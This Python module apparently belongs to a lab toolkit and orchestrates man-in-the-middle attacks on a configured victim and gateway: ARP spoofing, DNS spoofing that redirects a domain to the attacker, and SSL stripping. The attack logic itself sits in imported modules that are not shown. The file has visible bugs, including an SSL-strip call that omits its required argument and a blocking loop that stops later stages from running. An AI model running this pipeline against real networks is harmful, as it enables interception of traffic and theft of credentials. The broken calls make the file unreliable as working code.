import time
import os
from src.attacks.arp_spoofing import start_arp_spoof, ARPSpoofer

from src.attacks.arp_spoofing import start_arp_spoof
from src.attacks.dns_spoofing import DnsSpoofingAttack
from src.attacks.dns_spoofing import start_dns_spoof
from src.attacks.ssl_strip import start_sslstrip

from .config import load_config
from .network import check_lab_reachability, ping, enable_ip_forwarding

""" src/core/mitm_pipeline.py: Module for managing MITM attack pipelines.
    Provides functions to set up, monitor, and tear down MITM attack pipelines. """

running_attacks = {}

def start_arp_mitm():
    # Placeholder for starting ARP MITM attack
    # Import from attacks.arp_spoof
    config = load_config()
    target_ip = config["victim"]["ip"]    
    gateway_ip = config["gateway"]["ip"]

    print(f"[INFO] Starting ARP MITM attack between {target_ip} and {gateway_ip}")
    
    if not enable_ip_forwarding():
        return 

    spoofer_thread: ARPSpoofer = start_arp_spoof(target_ip, gateway_ip)

    # Test connectivity after attack
    if ping(target_ip):
        print(f"[INFO] Victim {target_ip} is reachable after ARP spoof.")
    else:
        print(f"[ERROR] Victim {target_ip} is NOT reachable after ARP spoof.")

    if spoofer_thread:
        running_attacks['arp'] = spoofer_thread
        print("[INFO] ARP Spoofing successfully started in a separate thread.")
    else:
        print("[ERROR] ARP Spoofing failed to start.")
    

def dns_spoof():
    config = load_config()
    victim_ip = config['victim']['ip']
    gateway_ip = config['gateway']['ip']
    attacker_ip = config['attacker']['ip']
    domain_name = config['domain']['name']

    print(f"[INFO] Starting DNS spoof for {domain_name} to {attacker_ip}...")
    attack = DnsSpoofingAttack(
        domain=domain_name,
        fake_ip=attacker_ip,
        target_ip=victim_ip,
        gateway_ip=gateway_ip
    )
    try:
        attack.start()
        print("[INFO] DNS spoofing attack started. Press Ctrl+C to stop.")
        # Keep the main thread alive while the attack runs
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[INFO] Stopping DNS spoofing attack.")
    finally:
        attack.stop()
        print("[INFO] DNS spoofing attack stopped.")

def start_ssl_strip(target_ip: str):
    # Placeholder for starting SSL stripping attack
    # Import from attacks.ssl_strip
    print(f"[INFO] Starting SSL strip on Victim {target_ip}...")
    
    # Call the SSL strip attack (stubbed function for now)
    start_sslstrip(target_ip)

def teardown_pipeline():
    """Stops all running attack threads and restores network state."""
    print("\n[INFO] Starting MITM pipeline teardown...")
    
    if 'arp' in running_attacks and running_attacks['arp'].is_alive():
        # ARPSpoofer.stop() handles the ARP table restoration
        running_attacks['arp'].stop()
        running_attacks['arp'].join(timeout=3) # Wait for the thread to finish
        del running_attacks['arp']
        
    try:
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        print("[INFO] IP forwarding disabled.")
    except Exception:
        pass 
        
    print("[INFO] Teardown complete. Exiting.")

def run(mode: str):
    """ Run the MITM pipeline based on the specified mode. """
    reachability = check_lab_reachability()
    if not all(reachability.values()):
        print("One or more lab components are unreachable:")
        for role, reachable in reachability.items():
            if not reachable:
                print(f" - {role} is unreachable")
        return

    try:
        if mode == "arp":
            start_arp_mitm()
        elif mode == "dns":
            start_arp_mitm()
            dns_spoof()
        elif mode == "ssl":
            start_arp_mitm()
            start_ssl_strip()
        elif mode == "arp+dns+ssl":
                start_arp_mitm()
                dns_spoof()
                start_ssl_strip()
        else:
            print(f"Unknown mode: {mode}")

        if running_attacks:
            print("[INFO] MITM pipeline running. Press Ctrl+C to stop attacks and restore tables.")
            # Simple loop to keep main thread running
            while any(t.is_alive() for t in running_attacks.values()):
                time.sleep(1)

    except KeyboardInterrupt:
        print("\n[INTERRUPT] Received user interrupt (Ctrl+C).")
    except Exception as e:
        print(f"[FATAL ERROR] Pipeline terminated unexpectedly: {e}")
    finally:
        # Ensure cleanup runs regardless of how the script exits
        teardown_pipeline()
